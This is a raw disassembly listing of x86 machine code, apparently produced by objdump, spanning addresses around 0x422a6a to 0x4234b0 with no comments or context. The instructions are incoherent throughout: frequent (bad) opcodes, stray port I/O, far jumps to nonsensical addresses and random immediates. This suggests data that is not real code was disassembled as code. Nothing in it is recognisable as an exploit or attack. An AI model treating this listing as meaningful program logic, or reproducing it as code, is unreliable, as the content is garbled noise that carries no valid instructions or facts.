  422a6a:	out    0xcf,eax
  422a6c:	nop
  422a6d:	xchg   edx,eax
  422a6e:	jecxz  0x422a01
  422a70:	push   edi
  422a71:	jmp    0x124c1783
  422a76:	sub    cl,al
  422a78:	mov    ch,0x63
  422a7a:	rcr    BYTE PTR [ebp-0xe50ddf],cl
  422a80:	popf   
  422a81:	mov    al,ch
  422a83:	ret    0x5c7e
  422a86:	test   eax,0x6e521797
  422a8b:	inc    edx
  422a8c:	fdiv   DWORD PTR [ecx]
  422a8e:	and    DWORD PTR [esi-0x54],0xfffffff9
  422a92:	test   BYTE PTR [edi-0x26],al
  422a95:	(bad)  
  422a96:	dec    ebx
  422a97:	mov    esp,0x19311976
  422a9c:	jns    0x422a3a
  422a9e:	stos   DWORD PTR es:[edi],eax
  422a9f:	cdq    
  422aa0:	shl    eax,cl
  422aa2:	dec    esp
  422aa3:	mov    cl,0xc9
  422aa5:	adc    dh,cl
  422aa7:	dec    eax
  422aa8:	xchg   DWORD PTR [ecx+0x73],esi
  422aab:	aam    0x3b
  422aad:	das    
  422aae:	jp     0x422ac0
  422ab0:	dec    esi
  422ab1:	mov    ch,0xec
  422ab3:	jo     0x422afa
  422ab5:	(bad)  
  422ab6:	jne    0x422ab7
  422ab8:	nop
  422ab9:	add    edx,DWORD PTR [edx]
  422abb:	inc    edx
  422abc:	in     al,dx
  422abd:	xor    ecx,DWORD PTR [eax]
  422abf:	(bad)  
  422ac1:	or     ecx,DWORD PTR [edx]
  422ac3:	jo     0x422a55
  422ac5:	cwde   
  422ac6:	fcmovne st,st(5)
  422ac8:	or     ch,BYTE PTR [ebp+0x2e8bcf52]
  422ace:	sahf   
  422acf:	or     dl,BYTE PTR [ecx-0x56dc55bf]
  422ad5:	jnp    0x422a5c
  422ad7:	out    dx,ax
  422ad9:	or     ch,BYTE PTR [esi]
  422adb:	xchg   esp,eax
  422adc:	dec    ecx
  422add:	ftst   
  422adf:	add    eax,0x2cd063f3
  422ae4:	imul   ecx,ecx,0xfffffff1
  422ae7:	mov    al,0xb4
  422ae9:	in     al,0xa7
  422aeb:	push   cs
  422aec:	adc    BYTE PTR ss:[eax-0x62],bh
  422af0:	jo     0x422aab
  422af2:	and    DWORD PTR [edi+0x7a90b1b9],0xf1e07b00
  422afc:	jl     0x422abf
  422afe:	dec    edx
  422aff:	or     DWORD PTR [ecx],esi
  422b01:	(bad)  
  422b02:	push   ds
  422b03:	sbb    BYTE PTR [edx+edi*4-0x35],ch
  422b07:	stos   BYTE PTR es:[edi],al
  422b08:	addr16 cwde 
  422b0a:	lahf   
  422b0b:	jnp    0x422b4e
  422b0d:	test   DWORD PTR [ebx],edi
  422b0f:	sbb    BYTE PTR [ebx+0x7eeac3ae],0x22
  422b16:	push   0x8
  422b18:	add    DWORD PTR [edi],0x52
  422b1b:	and    ebx,eax
  422b1d:	xor    eax,0x69f11bee
  422b22:	into   
  422b23:	mov    WORD PTR [esi],cs
  422b25:	dec    ebx
  422b26:	pop    ebp
  422b27:	xchg   esp,eax
  422b28:	test   al,0x6b
  422b2a:	mov    dl,0x1f
  422b2c:	xor    DWORD PTR [esi+ebx*2],esi
  422b2f:	jbe    0x422afc
  422b31:	fisub  WORD PTR [edx+0x6a]
  422b34:	lods   eax,DWORD PTR ds:[esi]
	...
  422b95:	add    BYTE PTR [edi+esi*1+0x4a],al
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx+0x1108cd1c]
  422ba5:	int    0x3f
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [edi],ch
  422baf:	neg    BYTE PTR [edx-0x2741b4b6]
  422bb5:	ins    BYTE PTR es:[edi],dx
  422bb6:	lds    edi,FWORD PTR [ecx+0x683f0712]
  422bbc:	aaa    
  422bbd:	mov    BYTE PTR [eax+0x63c7954e],cl
  422bc3:	sahf   
  422bc4:	jno    0x422b7d
  422bc6:	push   esi
  422bc7:	sub    ah,BYTE PTR [ebx-0x5ae61b1]
  422bcd:	jns    0x422beb
  422bcf:	inc    edx
  422bd0:	pop    ebp
  422bd1:	ret    0x76c3
  422bd4:	xchg   ecx,eax
  422bd5:	ja     0x422bac
  422bd7:	dec    ebx
  422bd8:	xchg   ecx,eax
  422bd9:	sbb    al,0xc
  422bdc:	add    BYTE PTR [eax-0x72fbe9ac],bl
  422be2:	out    dx,al
  422be3:	std    
  422be4:	je     0x422b8c
  422be6:	inc    esi
  422be7:	or     eax,DWORD PTR [esi]
  422be9:	sbb    al,0x61
  422beb:	in     eax,0x88
  422bed:	ficom  DWORD PTR [edi+eiz*2]
  422bf0:	jne    0x422bfa
  422bf2:	mov    bh,0xca
  422bf4:	int3   
  422bf5:	and    DWORD PTR [edx+0x1a],edi
  422bf8:	repnz lods al,BYTE PTR ds:[esi]
  422bfa:	push   esi
  422bfb:	jne    0x422c5b
  422bfd:	test   eax,0x2ba1e7b
  422c02:	std    
  422c03:	cdq    
  422c04:	loopne 0x422c6a
  422c06:	icebp  
  422c07:	jno    0x422bea
  422c09:	xor    al,0xff
  422c0b:	out    dx,al
  422c0c:	imul   esp,DWORD PTR [esi-0x36],0xffffffec
  422c10:	or     ecx,ecx
  422c12:	adc    DWORD PTR [ebp-0x1a],eax
  422c15:	xor    DWORD PTR ds:0x7035a8af,ecx
  422c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c1c:	xchg   edi,eax
  422c1d:	test   BYTE PTR ds:0x5dd44c84,ah
  422c23:	add    BYTE PTR [eax-0x69d602c],bl
  422c29:	jae    0x422c90
  422c2b:	add    BYTE PTR [esi],bl
  422c2d:	in     al,dx
  422c2e:	mov    cl,0xd9
  422c30:	test   BYTE PTR [ecx+ebx*2],ch
  422c33:	loopne 0x422c9c
  422c35:	lods   eax,DWORD PTR ds:[esi]
  422c36:	jno    0x422c81
  422c38:	sbb    cl,BYTE PTR [ebx+0x6d]
  422c3b:	sahf   
  422c3c:	pop    ds
  422c3d:	and    eax,0xa99ae5ff
  422c42:	retf   
  422c43:	(bad)  
  422c44:	outs   dx,BYTE PTR ds:[esi]
  422c45:	jb     0x422c78
  422c47:	mov    cl,0x93
  422c49:	pop    ss
  422c4a:	mov    esp,0x9fde5c4a
  422c4f:	fcmovne st,st(4)
  422c51:	inc    esi
  422c52:	dec    esp
  422c53:	mov    bh,0xd2
  422c55:	push   ebx
  422c56:	mul    DWORD PTR [eax]
  422c58:	mov    DWORD PTR ds:0x989b5019,ebp
  422c5e:	fs into 
  422c60:	nop
  422c61:	xchg   esi,eax
  422c62:	mov    al,ds:0xa71187c9
  422c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c68:	adc    DWORD PTR [esi],ebp
  422c6a:	in     eax,0x4
  422c6c:	loope  0x422cbf
  422c6e:	sbb    al,0xd1
  422c70:	cmc    
  422c71:	lods   al,BYTE PTR ds:[esi]
  422c72:	ficom  WORD PTR [ebx]
  422c74:	jl     0x422c21
  422c76:	test   eax,0x6ed4c8ab
  422c7b:	ins    DWORD PTR es:[edi],dx
  422c7c:	xor    bh,BYTE PTR [ebp+0x4f]
  422c7f:	xor    DWORD PTR [ebp-0xa],esi
  422c82:	ins    BYTE PTR es:[edi],dx
  422c83:	rol    DWORD PTR [esi+eax*1-0x5bc495b3],0xac
  422c8b:	and    BYTE PTR [ebx-0x40199e20],cl
  422c91:	fwait
  422c92:	inc    ebp
  422c93:	test   eax,0xfad0d018
  422c98:	imul   ebp,DWORD PTR [esi+ecx*2-0x34],0x84dc2578
  422ca0:	push   0xffffffb7
  422ca2:	dec    esp
  422ca3:	or     al,0xbc
  422ca5:	into   
  422ca6:	(bad)  [ebx]
  422ca8:	mov    cl,0xe9
  422caa:	and    al,0x18
  422cac:	and    cl,BYTE PTR [ebx-0x32]
  422caf:	sbb    ebx,DWORD PTR ds:0x5dc873eb
	...
  422d15:	add    BYTE PTR [edi+0x626d60bd],bh
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fucomip st,st(5)
  422d23:	fnstcw WORD PTR [ebx+0x32]
  422d26:	inc    esi
  422d27:	jb     0x422d2a
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [eax+0xb97aaca],al
  422d33:	mov    WORD PTR [eax-0x4b61c19b],ds
  422d39:	mov    bh,0xee
  422d3b:	fdivr  QWORD PTR [esi-0x1bfe66c3]
  422d41:	jns    0x422db8
  422d43:	pop    esp
  422d44:	or     al,0xdb
  422d46:	adc    DWORD PTR [eax-0x3d],ebp
  422d49:	dec    esp
  422d4a:	ds dec esp
  422d4c:	outs   dx,DWORD PTR ds:[esi]
  422d4d:	jmp    0xc4266b87
  422d52:	ss cmp al,0xcf
  422d55:	inc    esp
  422d56:	addr16 in al,dx
  422d58:	jno    0x422cf2
  422d5a:	arpl   WORD PTR [ebp+0x47462211],ax
  422d60:	ss jnp 0x422dc9
  422d63:	cmc    
  422d64:	sub    DWORD PTR ds:0x5c69b9b5,ebp
  422d6a:	xrelease mov DWORD PTR [ebx],ecx
  422d6d:	int    0x22
  422d6f:	mov    cl,0xb
  422d71:	push   ecx
  422d72:	or     al,0xae
  422d74:	cmp    DWORD PTR [edx+0x2fc95e96],esi
  422d7a:	sti    
  422d7b:	xchg   esp,eax
  422d7c:	jno    0x422d3a
  422d7e:	icebp  
  422d7f:	inc    ebx
  422d80:	fcom   st(4)
  422d82:	sub    BYTE PTR [eax-0x48337c56],bh
  422d88:	sbb    bh,dh
  422d8a:	or     esi,esi
  422d8c:	jecxz  0x422dd4
  422d8e:	call   0x484d:0xeb494e3b
  422d95:	adc    dh,BYTE PTR [ecx-0x694605ad]
  422d9b:	imul   ebp,DWORD PTR ds:0x71ecd3b6,0xffffff8b
  422da2:	inc    ecx
  422da3:	adc    al,0x56
  422da5:	out    0xb6,al
  422da7:	outs   dx,BYTE PTR ds:[esi]
  422da8:	jae    0x422dc2
  422daa:	mov    eax,edi
  422dac:	and    eax,DWORD PTR [edx+0xd]
  422daf:	mov    dh,0x1a
  422db1:	mov    bh,0xba
  422db3:	push   0xa0b5c913
  422db8:	ret    0x894f
  422dbb:	xlat   BYTE PTR ds:[ebx]
  422dbc:	std    
  422dbd:	inc    edx
  422dbe:	sub    esp,eax
  422dc0:	imul   esp,DWORD PTR [ecx+ebp*1],0xffffffec
  422dc4:	mov    al,0xf6
  422dc6:	(bad)  
  422dc8:	xchg   DWORD PTR cs:[ebx+0x1e2dfef6],edi
  422dcf:	jmp    DWORD PTR ds:0x736fe542
  422dd5:	jae    0x422d94
  422dd7:	mov    ds:0xf26e6094,al
  422ddc:	in     al,0x23
  422dde:	push   es
  422ddf:	or     eax,0x83f38b55
  422de4:	adc    eax,0x94ba605c
  422de9:	xor    BYTE PTR [ebx+0x1a],bh
  422dec:	das    
  422ded:	mov    ?,esp
  422def:	nop
  422df0:	iret   
  422df1:	pop    ss
  422df2:	cs dec esp
  422df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df5:	dec    esp
  422df6:	inc    esp
  422df7:	cmc    
  422df8:	lock loope 0x422e11
  422dfb:	and    BYTE PTR [esi-0x3e],0x66
  422dff:	mov    ch,0xe3
  422e01:	(bad)  
  422e02:	sbb    al,0x61
  422e04:	fld    TBYTE PTR [ebx]
  422e06:	mov    eax,0x7d8ef011
  422e0b:	popf   
  422e0c:	mov    esp,0xd4d507ae
  422e11:	out    dx,eax
  422e12:	shl    BYTE PTR [ebp-0xef4a5de],1
  422e18:	mov    bl,0x37
  422e1a:	in     al,dx
  422e1b:	cdq    
  422e1c:	push   ss
  422e1d:	cdq    
  422e1e:	mov    bh,0x0
  422e20:	mov    ecx,0xcb789be0
  422e25:	cmp    al,dl
  422e27:	sub    edx,esp
  422e29:	je     0x422e81
  422e2b:	aad    0xd1
  422e2d:	xor    ebx,DWORD PTR [esi]
  422e2f:	call   eax
  422e31:	das    
  422e32:	pusha  
  422e33:	jbe    0x422ea1
	...
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0xe51ccaba
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [ebx],bl
  422eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422eb0:	repz mov eax,ds:0x9fa18bd5
  422eb6:	or     di,cx
  422eb9:	pop    esi
  422eba:	xchg   edx,eax
  422ebb:	sbb    BYTE PTR [edi-0x23],ah
  422ebe:	ret    0x4519
  422ec1:	pop    ebx
  422ec2:	stc    
  422ec3:	jp     0x422e91
  422ec5:	in     eax,0xea
  422ec7:	loopne 0x422e61
  422ec9:	sti    
  422eca:	jp     0x422ead
  422ecc:	addr16 syscall 
  422ecf:	iret   
  422ed0:	fucom  st(6)
  422ed2:	jnp    0x422e8a
  422ed4:	pop    ss
  422ed5:	or     esi,DWORD PTR [edx]
  422ed7:	das    
  422ed8:	scas   eax,DWORD PTR es:[edi]
  422ed9:	mov    DWORD PTR [esi],edx
  422edb:	add    ebp,DWORD PTR [ecx+0x3a]
  422ede:	imul   eax,DWORD PTR [ecx-0x70],0xedbdb3be
  422ee5:	fimul  WORD PTR [ebx]
  422ee7:	xor    ebp,edi
  422ee9:	das    
  422eea:	push   0xffffffec
  422eec:	cmp    cl,BYTE PTR [ecx-0x6a]
  422eef:	add    DWORD PTR [ebp+0x5e],0x4b58043b
  422ef6:	imul   edi,DWORD PTR [esi-0x6d],0x1e
  422efa:	cmp    al,0xa5
  422efc:	or     ch,BYTE PTR [edi]
  422efe:	es push edx
  422f00:	(bad)  
  422f02:	push   esp
  422f03:	and    al,dh
  422f05:	dec    esp
  422f06:	loopne 0x422f75
  422f08:	sbb    cl,BYTE PTR [edx-0x39b2b5bc]
  422f0e:	dec    eax
  422f0f:	scas   al,BYTE PTR es:[edi]
  422f10:	mov    esp,0xfe0c76c2
  422f15:	add    DWORD PTR [esi+edi*8],esi
  422f18:	or     BYTE PTR [edi+0x63],al
  422f1b:	sahf   
  422f1c:	and    al,0x4f
  422f1e:	dec    edi
  422f1f:	mov    ch,0x74
  422f21:	sti    
  422f22:	xchg   esi,eax
  422f23:	loopne 0x422edd
  422f25:	sbb    dh,dh
  422f27:	or     DWORD PTR [ecx+0x42],ebx
  422f2a:	stc    
  422f2b:	imul   esi,esp,0xffffffa9
  422f2e:	hlt    
  422f2f:	push   edx
  422f30:	mov    eax,ds:0x1a2233df
  422f35:	sub    BYTE PTR [edi],ah
  422f37:	sbb    eax,0xd41513cf
  422f3c:	inc    eax
  422f3d:	inc    edx
  422f3e:	or     bh,cl
  422f40:	jl     0x422f40
  422f42:	mov    cl,BYTE PTR [edx]
  422f44:	jbe    0x422eef
  422f46:	lods   al,BYTE PTR ds:[esi]
  422f47:	lds    ebx,FWORD PTR [edi-0x6a]
  422f4a:	and    esp,ecx
  422f4c:	jns    0x422ee8
  422f4e:	cmp    BYTE PTR [eax+0x14e70860],0x14
  422f55:	mov    ah,bl
  422f57:	pushf  
  422f58:	sbb    al,0x81
  422f5a:	lock cmp cl,BYTE PTR [esi-0x25520314]
  422f61:	jmp    0x88f0:0x75abc6a
  422f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f69:	or     dh,0xdb
  422f6c:	push   ebx
  422f6d:	(bad)  
  422f6e:	mov    esp,0xa3883ace
  422f73:	in     al,dx
  422f74:	rcr    DWORD PTR [edx+eiz*2-0x3b],0x30
  422f79:	(bad)  
  422f7a:	fiadd  DWORD PTR [esi+0x73442c7d]
  422f80:	stc    
  422f81:	lds    edi,FWORD PTR [ebx+0xb99e4c6]
  422f87:	retf   
  422f88:	nop
  422f89:	add    al,0x99
  422f8b:	(bad)
  422f8e:	fsqrt  
  422f90:	int3   
  422f91:	das    
  422f92:	mov    ah,0xc2
  422f94:	jg     0x422f1e
  422f96:	loop   0x422f6f
  422f98:	scas   al,BYTE PTR es:[edi]
  422f99:	ret    0xca77
  422f9c:	repnz clc 
  422f9e:	mov    bl,0x6
  422fa0:	adc    eax,0x4465d043
  422fa5:	outs   dx,BYTE PTR ds:[esi]
  422fa6:	cdq    
  422fa7:	dec    ecx
  422fa8:	add    DWORD PTR [ecx-0x1d9ab629],0x62192390
  422fb2:	adc    BYTE PTR ds:0x6a,bh
	...
  423014:	add    BYTE PTR [eax],al
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [edi],esi
  423023:	sbb    ecx,DWORD PTR [esi-0x64]
  423026:	push   esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    dh,cl
  42302f:	sub    dh,BYTE PTR [esi+0x4c]
  423032:	xchg   BYTE PTR [edx],dh
  423034:	outs   dx,DWORD PTR ds:[esi]
  423035:	ficomp WORD PTR [ebp+0x7bb120b2]
  42303b:	gs nop
  42303d:	jl     0x422ffa
  42303f:	push   edi
  423040:	call   0x97f56db
  423045:	loopne 0x423059
  423047:	push   edi
  423048:	mov    ds:0xc375f17c,eax
  42304d:	pop    DWORD PTR [ebp-0x3f]
  423050:	fsubr  DWORD PTR [edx]
  423052:	(bad)  
  423053:	lea    esi,[ecx-0x16]
  423056:	sub    al,0x32
  423058:	pop    ds
  423059:	fwait
  42305a:	(bad)  
  42305b:	into   
  42305c:	mov    ds:0x732f8b44,al
  423061:	mov    ds:0x8bdc3bd1,al
  423066:	mov    DWORD PTR [eax-0x5ed5f5ec],esp
  42306c:	cs pop esp
  42306e:	mov    ebx,0x54be28fa
  423073:	sub    BYTE PTR [edx+0x8],bl
  423076:	out    0xb8,eax
  423078:	sub    bh,al
  42307a:	and    DWORD PTR [ebp-0x7ad9bfc],eax
  423080:	and    ch,cl
  423082:	cmc    
  423083:	pop    ds
  423084:	rol    BYTE PTR [ebp-0x287997ca],cl
  42308a:	das    
  42308b:	and    eax,0x78a54c1f
  423090:	xor    edx,DWORD PTR [ecx-0x5ad6cc0a]
  423096:	dec    ecx
  423097:	push   ebp
  423098:	mov    eax,0xbb8baa3c
  42309d:	sub    ebp,DWORD PTR [edi-0x2a22caa8]
  4230a3:	mov    dl,0x83
  4230a5:	lods   eax,DWORD PTR ds:[esi]
  4230a6:	mov    ah,0x71
  4230a8:	retf   
  4230a9:	iret   
  4230aa:	into   
  4230ab:	xchg   ecx,eax
  4230ac:	inc    ebp
  4230ad:	ror    BYTE PTR [edi+0x137573c3],cl
  4230b3:	and    cl,dl
  4230b5:	mov    esi,0xfb30063a
  4230ba:	test   al,0x32
  4230bc:	lds    esp,FWORD PTR [esp+eiz*2+0x1aeaacbf]
  4230c3:	push   esi
  4230c4:	push   es
  4230c5:	and    eax,0xc90dc188
  4230ca:	dec    edi
  4230cb:	inc    eax
  4230cc:	sbb    al,cl
  4230ce:	iret   
  4230cf:	nop
  4230d0:	sbb    dl,BYTE PTR [edi-0x5db47570]
  4230d6:	ins    DWORD PTR es:[edi],dx
  4230d7:	and    bh,BYTE PTR [ebp-0x5f43cc5]
  4230dd:	inc    esi
  4230de:	sahf   
  4230df:	push   0xaaeaf35
  4230e4:	adc    BYTE PTR ds:0x4b2cb49c,bh
  4230ea:	iret   
  4230eb:	cmp    DWORD PTR [edx],esi
  4230ed:	mov    ebp,0xa3ab53fc
  4230f2:	inc    esp
  4230f3:	push   esi
  4230f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f5:	fldcw  WORD PTR [edx+0x59]
  4230f8:	mov    cl,bl
  4230fa:	shl    BYTE PTR [ecx],cl
  4230fc:	cmc    
  4230fd:	cmp    BYTE PTR [ebp+0x5f],bl
  423100:	cld    
  423101:	xor    eax,0x8617d171
  423106:	aam    0x38
  423108:	out    0x9a,al
  42310a:	jl     0x42312b
  42310c:	ret    
  42310d:	cmc    
  42310e:	fstp   DWORD PTR [eax]
  423110:	inc    edx
  423111:	imul   eax,DWORD PTR [ecx+ecx*8+0x36],0x83ae4812
  423119:	gs push 0x53204636
  42311f:	fcomp  st(6)
  423121:	fs xchg ecx,eax
  423123:	jmp    0x71a0:0xaf9443e8
  42312a:	jnp    0x4230db
  42312c:	xor    BYTE PTR [esi-0x2f],ah
  42312f:	aas    
  423130:	out    dx,eax
  423131:	outs   dx,BYTE PTR ds:[esi]
  423132:	mov    ch,al
  423134:	rol    BYTE PTR [eax],cl
	...
  423196:	jns    0x423189
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	cmp    BYTE PTR [edx-0x13],0xb8
  4231a5:	mov    DWORD PTR [ebx+0x75],ebx
  4231a8:	add    DWORD PTR [eax],eax
  4231aa:	pop    es
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    bh,al
  4231af:	and    eax,0x294fbf62
  4231b4:	add    al,0xd2
  4231b6:	ror    dh,cl
  4231b8:	xor    dh,BYTE PTR [ebx+esi*2+0x27c22e76]
  4231bf:	xor    eax,0xc72abee7
  4231c4:	dec    ecx
  4231c5:	inc    edx
  4231c6:	mov    ebp,0xbd2edc63
  4231cb:	cmp    dh,BYTE PTR [edx-0x79243934]
  4231d1:	dec    ecx
  4231d2:	and    BYTE PTR [edx],ah
  4231d4:	ss sti 
  4231d6:	push   ecx
  4231d7:	adc    eax,0xfce6163d
  4231dc:	rcl    BYTE PTR [ecx+esi*2+0x7c099fcb],1
  4231e3:	sub    BYTE PTR [ebx+0x1928538d],0x1
  4231ea:	cdq    
  4231eb:	xchg   ebx,eax
  4231ec:	ins    BYTE PTR es:[edi],dx
  4231ed:	mov    ah,BYTE PTR [ebp+eiz*1-0xc0bc412]
  4231f4:	(bad)  
  4231f5:	push   ebp
  4231f6:	cld    
  4231f7:	mov    ebp,DWORD PTR [ecx+0x15]
  4231fa:	test   eax,0xacfd89fe
  4231ff:	inc    esi
  423200:	sub    eax,0x527e9b3f
  423205:	jns    0x423282
  423207:	xor    ebx,DWORD PTR [esp+ebx*2-0x7e]
  42320b:	stc    
  42320c:	scas   eax,DWORD PTR es:[edi]
  42320d:	sbb    BYTE PTR [esp+esi*8-0x25],dl
  423211:	inc    ebp
  423212:	push   eax
  423213:	les    eax,FWORD PTR es:[edi-0x27]
  423217:	nop
  423218:	addr16 push ebx
  42321a:	leavew 
  42321c:	test   edi,eax
  42321e:	and    eax,0xdde8a1bc
  423223:	jle    0x4231ba
  423225:	jmp    FWORD PTR [edi+0xd002eb0]
  42322b:	fbld   TBYTE PTR [esi+edi*2+0x31e839a7]
  423232:	shl    DWORD PTR [edi+eiz*2-0x6b694973],cl
  423239:	stos   DWORD PTR es:[edi],eax
  42323a:	mov    edx,0xd0d25ad2
  42323f:	rol    BYTE PTR ds:0xed86d54b,1
  423245:	xlat   BYTE PTR ds:[ebx]
  423246:	dec    ecx
  423247:	mov    WORD PTR [esi*2+0x6a7280e1],?
  42324e:	imul   ebx,ecx,0x64
  423251:	loope  0x423239
  423253:	pusha  
  423254:	fmul   DWORD PTR [ecx]
  423256:	aas    
  423257:	and    dl,BYTE PTR [eax]
  423259:	popf   
  42325a:	lds    ebp,FWORD PTR [esi-0x50908279]
  423260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423261:	xor    ebx,DWORD PTR [ebp+0x1b7d867f]
  423267:	add    edx,DWORD PTR ss:0xbe328a10
  42326e:	scas   al,BYTE PTR es:[edi]
  42326f:	(bad)  
  423271:	cmp    al,0x6d
  423273:	ja     0x4232b8
  423275:	push   ecx
  423276:	xchg   ebp,eax
  423277:	cwde   
  423278:	imul   esp,DWORD PTR [ebx-0x3494040b],0xffffffd4
  42327f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423280:	push   0x530c0d9
  423285:	dec    eax
  423286:	add    eax,0x5f80c798
  42328b:	adc    BYTE PTR [esi+0x3bb1db3a],0xa8
  423292:	fldcw  WORD PTR [esi+0x288dafff]
  423298:	pop    esp
  423299:	test   eax,0x1e7e5046
  42329e:	jbe    0x4232f5
  4232a0:	(bad)  
  4232a1:	ror    BYTE PTR [ecx],1
  4232a3:	cmp    al,0x18
  4232a5:	push   esi
  4232a6:	test   al,0xc7
  4232a8:	popf   
  4232a9:	push   edi
  4232aa:	test   eax,edx
  4232ac:	push   edi
  4232ad:	mov    ch,0x49
  4232af:	inc    esi
  4232b0:	xor    al,0xd1
  4232b2:	adc    al,0x53
  4232b4:	pop    eax
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	xor    eax,0x628fbd64
  423327:	jbe    0x42332a
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    bl,bh
  42332f:	cmc    
  423330:	ins    BYTE PTR es:[edi],dx
  423331:	nop
  423332:	cdq    
  423333:	mov    ds:0x59fdc35c,eax
  423338:	cld    
  423339:	xchg   edi,eax
  42333a:	pushf  
  42333b:	clc    
  42333c:	mov    esi,0x53c2efc5
  423341:	daa    
  423342:	call   0x6c7680ec
  423347:	sub    eax,0xfe281268
  42334c:	mov    esi,0xe65f65bc
  423351:	fisttp QWORD PTR [ecx+0x49]
  423354:	ins    BYTE PTR es:[edi],dx
  423355:	fidivr WORD PTR [edi-0x34c62905]
  42335b:	jg     0x423398
  42335d:	outs   dx,BYTE PTR ds:[esi]
  42335e:	loop   0x4233a3
  423360:	lock and eax,0x235d8ee5
  423366:	push   edx
  423367:	jmp    0x423379
  423369:	inc    esp
  42336a:	cmp    BYTE PTR [ecx-0x72],0xca
  42336e:	xchg   ebx,eax
  42336f:	bound  ebp,QWORD PTR [ecx-0x18]
  423372:	cs mov dh,0x65
  423375:	jmp    0xbd96:0x63903183
  42337c:	fadd   DWORD PTR [esi-0x32]
  42337f:	aaa    
  423380:	push   DWORD PTR [edx+edx*4-0x31de6b5d]
  423387:	idiv   DWORD PTR [ebx+edi*4]
  42338a:	pop    edi
  42338b:	pop    esi
  42338c:	aaa    
  42338d:	mov    al,ds:0x33e18b1c
  423392:	sbb    eax,0xb65877
  423397:	push   es
  423398:	outs   dx,DWORD PTR ds:[esi]
  423399:	sbb    ecx,ecx
  42339b:	repz popa 
  42339d:	sar    DWORD PTR [ecx-0xf],1
  4233a0:	lods   eax,DWORD PTR ds:[esi]
  4233a1:	push   edx
  4233a2:	ds push ds
  4233a4:	enter  0xa61a,0xa3
  4233a8:	jg     0x4233d6
  4233aa:	sbb    bl,ch
  4233ac:	dec    esi
  4233ad:	xchg   ecx,eax
  4233ae:	clc    
  4233af:	test   eax,0x48da669
  4233b4:	leave  
  4233b5:	in     al,dx
  4233b6:	sub    BYTE PTR [eax+edi*8+0x7b68934f],ch
  4233bd:	mov    eax,ds
  4233bf:	push   ss
  4233c0:	lods   eax,DWORD PTR ds:[esi]
  4233c1:	stos   DWORD PTR es:[edi],eax
  4233c2:	mov    bh,0x3d
  4233c4:	push   0x834cc03
  4233c9:	xchg   BYTE PTR [ecx],bh
  4233cb:	es jns 0x423361
  4233ce:	inc    ecx
  4233cf:	cmp    esi,DWORD PTR [ebp+0x44]
  4233d2:	or     eax,DWORD PTR [edx-0x12caddcf]
  4233d8:	inc    ebp
  4233d9:	call   0x268e:0x8ee4c17f
  4233e0:	clc    
  4233e1:	outs   dx,BYTE PTR ds:[esi]
  4233e2:	aam    0x1
  4233e4:	adc    al,0xd9
  4233e6:	sub    BYTE PTR [esi],ah
  4233e8:	mov    edi,0xdf229422
  4233ed:	and    esi,DWORD PTR ds:0xff9b9bd7
  4233f3:	cld    
  4233f4:	sbb    bl,0xb5
  4233f7:	mov    cl,0xe6
  4233f9:	jp     0x423478
  4233fb:	pusha  
  4233fc:	inc    ecx
  4233fd:	dec    esi
  4233fe:	and    DWORD PTR [esi+eiz*1],esi
  423401:	xchg   ebp,eax
  423402:	mov    bh,0xdc
  423404:	inc    ebx
  423405:	cmp    ecx,edi
  423407:	(bad)  
  423408:	and    BYTE PTR [edi-0x31],dh
  42340b:	inc    esi
  42340c:	jecxz  0x423420
  42340e:	pop    eax
  42340f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423410:	dec    edi
  423411:	repnz push ss
  423413:	test   eax,0x6f0a0775
  423418:	ss jg  0x4233a8
  42341b:	add    DWORD PTR [ebx+0x11b41af6],eax
  423421:	sar    DWORD PTR [edi+0x4a],cl
  423424:	and    dh,cl
  423426:	stos   DWORD PTR es:[edi],eax
  423427:	push   0xfffffffb
  423429:	ss pop ds
  42342b:	ret    
  42342c:	lock call DWORD PTR [esi-0x31]
  423430:	adc    al,0x1b
  423432:	test   ebx,esp
  423434:	data16 add BYTE PTR [eax],al
	...
  423493:	add    BYTE PTR [eax],al
  423495:	add    al,al
  423497:	mov    al,0x45
  423499:	outs   dx,DWORD PTR ds:[esi]
  42349a:	jne    0x42349b
  42349c:	jmp    0x5be0:0x16fb60bf
  4234a3:	cmp    cl,BYTE PTR [eax]
  4234a5:	retf   0x7769
  4234a8:	add    DWORD PTR [eax],eax
  4234aa:	pop    es
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    dh,dh
  4234af:	in     al,dx
  4234b0:	fild   WORD PTR [edi-0x334bf8f3]
